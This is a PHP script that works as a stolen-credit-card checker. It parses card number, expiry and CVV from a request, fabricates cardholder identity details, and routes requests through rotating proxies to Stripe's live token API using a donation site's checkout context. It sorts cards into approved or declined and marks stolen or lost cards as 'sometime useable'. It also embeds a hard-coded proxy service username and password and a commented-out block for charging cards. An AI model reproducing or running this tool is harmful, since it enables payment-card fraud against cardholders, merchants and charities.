<?php
 

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();
ob_start(); // begin collecting output

include 'proxy.php';

$proxy1 = ob_get_clean(); // retrieve output from myfile.php, stop buffering


////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$e=mt_rand(000,999);	
$email = "$name$last$e@gmail.com";//$matches1[1][0];
//preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Luminati Details]

$username = 'lum-customer-hl_d204d78e-zone-static';
$password = '@ftab3112';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
/////////========Luminati
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
////////=========Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $proxy1);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json',
'accept-encoding: gzip, deflate, br', 
'content-type: application/x-www-form-urlencoded',
'origin: https://checkout.stripe.com',
'referer: https://checkout.stripe.com/v3/GIQm89WqdPipo5cyACzNQ.html?distinct_id=314ea219-f40a-8b9f-ce2a-333e12efe2b6',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site'));
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+(stripe.js%2F8ab9a2f)&user_agent=Mozilla%2F5.0+(Linux%3B+Android+10%3B+Mi+A2)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F83.0.4103.106+Mobile+Safari%2F537.36&device_id=308d5648-2452-4c02-9ef1-88253d14a5e4&referrer=https%3A%2F%2Fndcf.fcsuite.com%2Ferp%2Fdonate%2Fcheckout&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$name.'&card[address_line1]='.$street.'&card[address_city]='.$city.'&card[address_state]='.$state.'&card[address_line1]=642+Easy+Rd&card[address_city]=Illiones&card[address_zip]=61349&card[address_country]=United+States&time_on_page=43197&guid=NA&muid=1cdcad74-bae1-4b2b-8444-74db3fc9d102&sid=c4c2a196-47a3-4a17-8521-8b44e09ed01c&key=pk_live_6hscEwgQZvA3tKpT528KJtIZ');

$result = curl_exec($ch);
////////////////////////////===[For Charging Cards]-[If U Want To Charge Your Card Uncomment And Add Site]

/*//$ch = curl_init();
//curl_setopt($ch, CURLOPT_URL, 'https://www.futureme.org/payments/stripe.json');
//curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
/*curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.futureme.org',
'accept: text/plain, *//*; q=0.01',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://www.futureme.org',
'referer: https://www.futureme.org/donate',
'Sec-Fetch-Mode: cors'));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'stripeToken=tok_Gtuws5vWQ3pzym&stripeEmail=jordanti02%40gmail.com&recurring=false&donationAmount=500&path=%2Fdonate');

echo $result = curl_exec($ch);
$message = trim(strip_tags(getStr($result,'"message":"','"'))); 
$token = trim(strip_tags(getStr($result,'"id": "','"')));
//////////////////////===[Card Response] */

if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CV MATCHED ✧✧Dragcchek✩✩ </span></br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVC MATCHED ✧✧Dragcchek✩✩ </span></br>';
}
elseif(strpos($result, "Thank You." )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVC MATCHED ✧✧Dragcchek✩✩ </span></br>';
}
elseif(strpos($result, "Your card's security code is incorrect." )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE ✧✧𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩✩ </span></br>';
}
elseif(strpos($result, "Your card's security code is invalid." )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE ✧✧𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩✩ </span></br>';
}
elseif (strpos($result, "incorrect_cvc")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE ✧✧𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩✩ </span></br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVC MATCHED - Incorrect Zip ✧✧𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩✩ </span></br>';
}
elseif (strpos($result, "stolen_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Stolen_Card - Sometime Useable ✧✧𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩✩ </span></br>';
}
elseif (strpos($result, "lost_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Lost_Card - Sometime Useable ✧✧𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩✩ </span></br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Insufficient Funds ✧✧𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩✩ </span></br>';
}
elseif(strpos($result, 'Your card has expired.')) {
  echo '<span class="badge badge-danger">#Reprovadas</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-info"> ★ Card Expired ✧✧𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩✩</span> </br>';
}
elseif (strpos($result, "pickup_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Pickup Card_Card - Sometime Useable ✧✧𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩✩ </span></br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<span class="badge badge-danger">#Reprovadas</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-info"> ★ Incorrect Card Number ✧✧𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩✩</span> </br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<span class="badge-">#Reprovadas</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-info"> ★ Incorrect Card Number ✧✧𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩✩</span> </br>';
}

elseif (strpos($result,  "generic_decline")) {
  echo '<span class="badge badge-danger">#Reprovadas</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-info"> ★ Declined : Generic_Decline ✧✧𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩✩</span> </br>';
}
  elseif(strpos($result, 'Your card was declined.')) {
  echo '<span class="badge badge-danger">#Reprovadas</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-info"> ★ Card Declined ✧✧𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩✩</span> </br>';

}
elseif (strpos($result, "do_not_honor")) {
  echo '<span class="badge badge-danger">#Reprovadas</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-info"> ★ Declined : Do_Not_Honor ✧✧𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩✩</span> </br>';
}
elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<span class="badge badge-danger">#Reprovadas</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-info"> ★ Security Code Check : Unchecked [Proxy Dead] ✧✧𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩✩</span> </br>';
}
elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<span class="badge badge-danger">#Reprovadas</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-info"> ★ Security Code Check : Fail ✧✧𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩✩</span> </br>';
}
elseif (strpos($result, "expired_card")) {
  echo '<span class="badge badge-danger">#Reprovadas</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-info"> ★ Expired Card ✧✧𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩✩</span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<span class="badge badge-danger">#Reprovadas</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-info"> ★ Card Doesnt Support This Purchase ✧✧𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩✩</span> </br>';
}
 else {
  echo '<span class="badge badge-danger">#Reprovadas</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-info"> ★ Proxy Dead / Error Not Listed ✧✧𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩✩</span> </br>';
}

curl_close($ch);
ob_flush();

//////=========Comment Echo $result If U Want To Hide Site Side Response 

///////////////////////////////////////////////===========================================================================\\\\\
